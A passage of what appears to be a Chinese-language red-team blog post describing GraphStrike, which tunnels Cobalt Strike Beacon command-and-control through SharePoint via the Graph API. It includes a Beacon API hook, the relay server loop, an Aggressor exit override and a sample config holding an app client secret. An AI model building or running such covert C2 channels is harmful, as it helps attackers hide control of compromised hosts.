SECTION( D ) BOOL InternetReadFile_Hook( HINTERNET hFile, 
                                          LPVOID lpBuffer, 
                                          DWORD dwNumberOfBytesToRead, 
                                          LPDWORD lpdwNumberOfBytesRead )
{
    BOOL bResult = FALSE;

    // Resolve API's
    struct MemAddrs* pMemAddrs = *(struct MemAddrs**)((PMEMADDR) OFFSET ( MemAddr ) )->address;

    // Call InternetReadFile
    bResult = ( BOOL )U_PTR( SPOOF( pMemAddrs->Api.net.InternetReadFile, 
                                     pMemAddrs->Api.net.hNet, 
                                     pMemAddrs->Api.net.size, 
                                     hFile, 
                                     C_PTR ( lpBuffer ), 
                                     C_PTR( U_PTR ( dwNumberOfBytesToRead ) ), 
                                     C_PTR( U_PTR ( lpdwNumberOfBytesRead ) ) ) );

    // Only run the following if this is a GraphStrike Beacon
    if (pMemAddrs->graphStrike)
    {
        // If we are reading data from a GET request, set readTasking to TRUE
        if(pMemAddrs->activeGet && *lpdwNumberOfBytesRead > 0)
            pMemAddrs->readTasking = TRUE;

        // Beacon calls InternetReadFile until it reads 0 data. Once we are completely done reading output,
        // upload a blank file to the TS tasking file to signal server we are ready for more tasking.
        else if(pMemAddrs->readTasking && *lpdwNumberOfBytesRead == 0)
        {
            pMemAddrs->readTasking = FALSE;            
            LPVOID response = MakeWebRequest(pMemAddrs->hInternet, 
                                              GRAPH_ADDRESS, 
                                              pMemAddrs->httpGetUri, 
                                              PUT_VERB, 
                                              pMemAddrs->httpPostHeaders, 
                                              NULL, 
                                              pMemAddrs );
            if (response)
                pMemAddrs->Api.msvcrt.free(response);            
        }
    }

    return bResult;
};
```

这与 Beacon 仅上传到 Beacon 输出文件的通常流程相反，但在我们完成读取后，通过将 TS 任务文件清零，Beacon 可以向 GraphStrike 服务器发出信号，表明它已收到最后一个任务并准备好执行更多。这也可以防止 Beacon 多次运行相同的命令，因为下次 Beacon 签入时（即使 GraphStrike 服务器出现故障或停止响应），它会将空白 TS 任务文件解释为“无任务，下次签入” ，然后回去睡眠。GraphStrike 服务器的逻辑与此配对，等待直到它看到 Beacon 已检索并清零 TS 任务文件，然后再尝试发送更多文件。

同样的动态也存在于 Beacon 输出文件中。当 GraphStrike 服务器检测到 Beacon 输出文件包含数据时，它会下载输出，然后上传一个空白文件以将 SharePoint 中的文件清零。每次检测到 http-post 循环时，Beacon 在 HttpOpenRequestA\_Hook 中发出一个外带请求，首先检查 Beacon 输出文件是否为空或上次输出是否被 GraphStrike 服务器接收，然后才允许 Beacon 继续上传输出。综合起来，这种方法可以缓解上述两个问题。

# GraphStrike 服务器

GraphStrike 服务器的工作是充当 TS 和 Graph API 之间的穿梭机或转换器。与迄今为止讨论的内容相比，该组件的开发过程要简单、顺利得多。首先也是最重要的一点是，它不需要写成与位置无关的 C；为了方便起见，它是用 Python 编写的。紧随其后的是，我们不再尝试操纵、快捷方式和用胶带将现有的二进制文件粘在一起以使其执行我们想要的操作，而是完全控制程序。虽然比较简单，但仍有一些事情值得讨论。

当服务器启动时，它会获取 Graph API 的访问令牌，然后进入无限循环，其中调用“CheckBeacons”函数：

```plain
# Call CheckBeacons continuously to service Beacon threads
    while(True):

        # Refresh access token if necessary
        currTime = time.time()
        if currTime > refreshTime:
             access_token, refreshTime = GetAccessToken()

        CheckBeacons()
        time.sleep(0.5)
```

"CheckBeacons" 开始通过进行 Graph API 请求，获取用于 GraphStrike 的特定 SharePoint 驱动器中存储的所有文件的列表。此查询返回的每个文件都与一个 Cobalt Strike Beacon 相关联，并添加到内部数据结构中进行跟踪。"CheckBeacons " 的后续调用再次获取此列表（该函数每半秒运行一次），并将其与内部模型中的数据进行比较；两者之间的差异作为服务器行为改变的信号。

在 SharePoint 中出现的每个新文件都代表一个全新的 Beacon，或者至少是与现有 TS 任务文件配对的新 Beacon 输出文件。Beacon 的 TS 任务文件和 Beacon 输出文件天然相关联，服务器利用这种关系和每个文件的状态作为其流控制策略的一部分。上一节中已经讨论了其中一些内容，涉及到在从 TS 发送更多任务之前等待 Beacon 下载并清空任务文件。实际上，服务器中的所有复杂性都涉及到需要符合 Beacon HTTP 事务生命周期的需求。服务器跟踪的每个 Beacon 都有一些相关的变量，用于更新、切换或引用，以便促进这一过程。即使对我来说，试图通过代码片段来追踪所有这些变量也会感到困惑，所以我选择保持细节简洁。

服务器为找到的每个唯一的 TS 任务文件启动一个新线程；每个线程代表一个 Beacon。此线程运行名为 "BeaconComms" 的函数，它是一个无限循环，用于为单个 Beacon 进行通信：

```plain
def BeaconComms(fileName):

    # Retrieve entry from dictionary
    comms = masterTracker[fileName]

    # Run in endless loop
    while True:

        # Block here depending on state of taskingReady event handler
        comms['taskingReady'].wait()

        # If killThread is true, a TS task has been queued for Beacon without it retrieving it for longer than
        # the allowed timeout and this BeaconComms channel has been signaled to exit to conserve resources.
        if comms['state'].state == 'timeout' and comms['killThread']:
            p_info(f"Beacon {comms['beaconId']}: timed out -> killing thread.")
            return

        # Send Beacon http-get to TS + return any tasking
        tasking = SendGetToTS(fileName, False)

        # If TS returned data, we need to upload it to the TS tasking file
        if len(tasking) > 0:
            UploadFile(fileName, tasking)

            # Clear taskingReady event handler so that we will block at the start of next loop until we see
            # that Beacon has received + cleared the TS tasking file
            comms['taskingReady'].clear()

        # Get current time before waiting for signal
        bt = datetime.datetime.now(datetime.timezone.utc)

        # Wait until we are signaled that Beacon has output, up to a max of the Beacon's sleep time
        comms['outputReady'].wait(comms['sleepTime'])

        # If the sleep ended because we were signaled, retrieve it and send to TS
        if comms['outputReady'].is_set():

            # If state is removing + killThread has been signaled, kill Beacon thread here.
            if (comms['state'].state == 'removing') and comms['killThread']:
                p_info(f"Beacon {comms['beaconId']}: removed from CS -> killing thread")
                return

            # Clear event handler so that we will block again in the future on this Beacon output file
            comms['outputReady'].clear()

            # Download the Beacon output file
            data = DownloadFile(comms['http-post'])

            # Zero out the Beacon output file to signal Beacon we have received the last
            UploadFile(comms['http-post'], str())

            # Send data to TS
            SendPostToTS(fileName, data)

            # If state is 'exiting' and killThread == True, we wait until here to kill Beacon thread so that
            # Beacon acknowledgement of exit is received + sent to TS
            if (comms['state'].state == 'exiting') and comms['killThread']:
                p_info(f"Beacon {comms['beaconId']}: exited gracefully -> killing thread")
                return

            # Get the current time after the wait has ended and calculate the difference 
            at = datetime.datetime.now(datetime.timezone.utc)
            elapsedTime = (at - bt).total_seconds()

            # Continue to sleep for the remainder of the sleep cycle
            if elapsedTime < comms['sleepTime']:
                print(f"continuing to sleep for: {str(comms['sleepTime'] - elapsedTime)} seconds longer...")
                time.sleep(comms['sleepTime'] - elapsedTime)
```

下表总结了主要事件/功能。用箭头分隔的行号表示只有当左侧行号处的逻辑条件得到满足时，右侧行号及其描述的操作才会发生。

| **行号** | **动作/细节** |
| --- | --- |
| 10  | 阻塞，直到主“CheckBeacons”函数发现该 Beacon 的 TS 任务文件为空并准备好执行更多任务。 |
| 19  | 向符合 graphstrike 配置文件的 TS 发送 GET 请求，以便检索 Cobalt Strike 中发出的任何任务。 |
| 22  | 根据 TS 是否从 GET 请求返回任务数据进行逻辑分支 |
| 22 → 23/27 | 将数据上传到 SharePoint 中的 TS 任务文件，然后切换“taskingReady”事件处理程序，以便我们在下一个循环的第 10 行处阻塞。 |
| 33  | 睡眠时间与 Beacon 设置的睡眠时间相同，或者直到发出“outputReady”事件处理程序信号，从而提前结束睡眠。 |
| 36  | 逻辑分支取决于“CheckBeacons”，发现该 Beacon 的输出文件不为空，因此具有应该下载的输出。 |
| 36 → 44 | 重置 outputReady 事件处理程序，以便我们在下一个循环的第 33 行阻塞/睡眠。 |
| 36 → 47 | 下载 Beacon 输出文件数据 |
| 36 → 50 | 将空白文件上传到 Beacon 输出文件，以通知 Beacon 它可以发送更多输出。 |
| 36 → 53 | Beacon 输出发送到 TS |
| 36 → 66/68 | 如果 Beacon 的剩余睡眠时间尚未完全过去，则睡眠。 |

基本上就是这样。虽然这一切都非常简单，但有一个主题值得进一步探讨，即服务器如何处理“退出”、“删除”和“睡眠”等 Cobalt Strike 命令。这些命令中的每一个都会改变 Beacon 在目标上的状态，但由于 GraphStrike 的架构，我们也确实需要在服务器内对这些命令进行操作。这不是一件容易的任务，因为 TS 在发出命令时返回的数据是加密的，因此我们无法轻松判断何时发出了其中一个命令。该解决方案涉及使用 Cobalt Strike 的 Aggressor 脚本语言在连接到 TS 执行任务之外单独与 GraphStrike 服务器进行通信。用于执行此操作的 GraphStrike.cna 脚本的一部分可以在此处看到：

```plain
alias exit {
    exitFunc($1);
}

sub exitFunc {
    local('$command $beaconIds @bids $id $data $output')

    # $1 gets passed in as different data types depending on how exit is called...
    if (typeOf($1) eq "class sleep.engine.types.StringValue")
    {
        add(@bids, $1);
    }
    else if (typeOf($1) eq "class sleep.runtime.CollectionWrapper")
    {
        addAll(@bids, $1);
    }

    foreach $id (@bids)
    {
        $beaconIds = $beaconIds . " " . $id;
    }

    $command = "cd $scriptDir && $scriptPath $teamserverIP exit $beaconIds && cd -";

    # Append instructions to command to redirect stderr to processStdout
    $command = $command . " 2>&1";

    # Run command in a subshell to redirect stderr -> processStdout
    $data = exec(@("/bin/sh", "-c", $command));

    # We don't really need the output, but reading the data lets us block
    # until the server has completed work before we issue Beacon commands.
    $output = join("\n", readAll($data));

    if (size(@bids) > 0)
    {
        foreach $id (@bids)
        {
            bexit($id);
        }
    }
    else
    {
        bexit($1);
    }
}
```

Aggressor 允许您覆盖标准的 Beacon 命令；在第 1 行，定义了一个新的'exit'命令，它调用第 5 行的'exitFunc'函数。当调用现有命令时，这些自定义函数的运行方式与 GraphLdr 中使用的方式类似，在执行用户预期的原始函数/代码之前，我们会执行一些额外的操作。在这个例子中，我们告诉操作系统运行一个名为'message.py'的 Python3 脚本。这个脚本包含在 GraphStrike 中，并用于连接到在 GraphStrike 服务器上暴露和监听的套接字。使用这个连接，Cobalt Strike 客户端向 GraphStrike 服务器发送一条消息，通知它退出命令和关联的 Beacon ID。对于'exit'命令，在服务器端我们所做的只是终止服务该 Beacon 的线程以节省资源，并从 SharePoint 中删除 TS 任务文件和 Beacon 输出文件。当然，'sleep'命令会调整'BeaconComms'循环中的睡眠时间，以与发给 Beacon 的命令相匹配。

在整个计划中有一个大问题。要做到这一点，TS 和 GraphStrike 服务器必须拥有一些共同的 Beacon 标识符。我能找到的唯一值是 Beacon 会话 ID；这个值包含在 Beacon 输出文件的名称中，位于 Beacon 元数据和分隔符之后。这里存在一个明显的问题，即只有在 Beacon 有输出要发送时才会创建 Beacon 输出文件；在那之前，我们只有 TS 任务文件，因此在我们使 Beacon 运行一个命令并返回输出之前，这个值对我们来说是不可用的...至少我是这么认为的。

开源工具再次挺身而出。我之前看到过各种“Cobalt Strike Beacon 配置解析器”，但从来没有太多理由亲自检查它们。Didier Stevens 几年前发布了一个用于此目的的工具，GraphStrike 服务器使用它来解决“GetBeaconId”函数中的这个障碍问题：

```plain
# External cs-decrypt-metadata.py script from https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py
metadataScript = "inc/cs-decrypt-metadata.py"
metadataCommand = f"{metadataScript} -f {CS_DIR}.cobaltstrike.beacon_keys -t 7:Metadata,13,12 " # Leave space as we tack on metadata afterwards

def GetBeaconId(metadata):
    beaconId = None
    output = subprocess.getoutput(metadataCommand + metadata).split()

    for line in output:
        if "bid:" in line:
            beaconId = output[output.index(line) + 2]

    # Make sure the metadata parser actually runs
    if beaconId == None:
        p_err("Cannot parse BeaconId: are you running in a venv / have you installed all dependencies?", True)
    else:
        return beaconId
```

'cs-decrypt-metadata.py' 工具可以获取 Beacon 的加密元数据，撤销应用的基于配置文件的屏蔽或操作，并使用存储在 TS 目录中的 TS 加密密钥（存储为'.cobaltstrike.beacon\_keys'）对其进行解密。这允许 GraphStrike 服务器可以从 TS 任务文件中恢复 Beacon 的会话 ID / Beacon ID，这意味着我们不再需要 Beacon 先发送输出。

# 配置程序

关于 GraphStrike 的[配置程序](https://github.com/RedSiege/GraphStrike/blob/main/setup/provisioner.py)，除了它的存在之外，没有太多要说的。在本文早期，我提到让 GraphStrike 易于使用和可重复使用是一个关键目标，而配置程序在实现这一目标中起到了一定的作用。当涉及到创建 Azure 租户并确保满足许可要求以拥有 SharePoint 站点时，用户需要自行处理，但是配置程序接手处理后续工作。它使用 Azure CLI Python 库与用户的租户进行交互，并创建 Azure 应用程序以及相关的客户端密钥，这些密钥将被 GraphStrike 使用。它还为应用程序分配所需的权限，以便它可以访问我们详细介绍的与文件相关的 Graph API 方法。最重要的是，它将获取该进程返回的所有变量和值，并在磁盘上创建两个文件：“config.h”和“config.py”。

-   配置文件中的信息，无论是一起使用还是某些情况下单独使用，都构成了敏感信息，请不要随意共享。下面示例中的值已经被审查或在发布时不再有效。

```plain
#include "include.h"

#define SHAREPOINT_ADDRESS C_PTR ( OFFSET ( "/v1.0/sites/CENSORED.sharepoint.com,23CEN360-aSO1-44ad-8R4-3a6b80ED10cb,c1CEN2efe-aSO9-4076-9R1-4SDW3918ED93a/drive" ) )
#define APP_CLIENT_ID C_PTR ( OFFSET ( "854b480d-a5fd-4789-b2c1-511a3ee4cef7" ) )
#define APP_CLIENT_SECRET C_PTR ( OFFSET ( "K7D8Q~esKoxpcHbnCeisbg4pTzzFrM3nDsSH1ca-" ) )
#define TENANT_ID C_PTR ( OFFSET ( "8aCEN074b-dSO1-4Rab-99c5-e381ED492902" ) )
#define BID_DELIMITER C_PTR ( OFFSET ( "pD9-tK") )
#define HTTP_GET_PREFIX C_PTR ( OFFSET ( "_" ) )
#define HTTP_POST_PREFIX C_PTR ( OFFSET ( "-_" ) )
```

```plain
#!/usr/bin/python3

1TENANT_ID = "8aCEN074b-dSO1-4Rab-99c5-e381ED492902"
CLIENT_ID = "854b480d-a5fd-4789-b2c1-511a3ee4cef7"
CLIENT_SECRET = "K7D8Q~esKoxpcHbnCeisbg4pTzzFrM3nDsSH1ca-"
SITE_ID = "CENSORED.sharepoint.com,23CEN360-aSO1-44ad-8R4-3a6b80ED10cb,c1CEN2efe-aSO9-4076-9R1-4SDW3918ED93a"
DRIVE_ID = "b!YCENSORED70EJJ880"
BID_DELIMITER = "pD9-tK"
HTTP_GET_PREFIX = "_"
HTTP_POST_PREFIX = "-_"
CS_DIR = "/opt/cobaltstrike/"
SLEEP_TIME = "5000"
```

Config.h 被编译到 GraphLdr 中，以便 UDRL 包含使用 Graph API 所需的所有信息。Config.py 同样由 GraphStrike 服务器在运行时加载，这样它就可以做同样的事情。当设置完成后，用户只需要启动他们的 TS，启动他们的 GraphStrike 服务器，然后将 GraphStrike 中的客户端文件夹分发给每个使用 Cobalt Strike 客户端连接到 TS 的操作员。加载 GraphStrike.cna 后，用户就可以创建 GraphStrike beacon 了。

# 结束语

非常感谢到目前为止一直支持我的读者。我希望这篇博客文章至少对一些人来说是有趣的，它可能有助于鼓励其他人尝试工具开发。可以在推特上的 @Octoberfest73 以及 Red Siege Discord 频道上了解有关 GraphStrike 的问题。

# 鸣谢

如果没有以下个人的贡献，GraphStrike 就不可能实现：

1.  [Kyle Avery](https://twitter.com/kyleavery_) 的 [AceLdr](https://github.com/kyleavery/AceLdr)
2.  [Dider Stevens](https://twitter.com/DidierStevens) 的 [cs-decrypt-metadata.py](https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py)
3.  来自 Red Siege 团队的 Mike Saunders、Corey Overstreet、Chris Truncer 和 Justin Palk 都善意地测试了 GraphStrike，并确定了在发布前修复的多个问题。
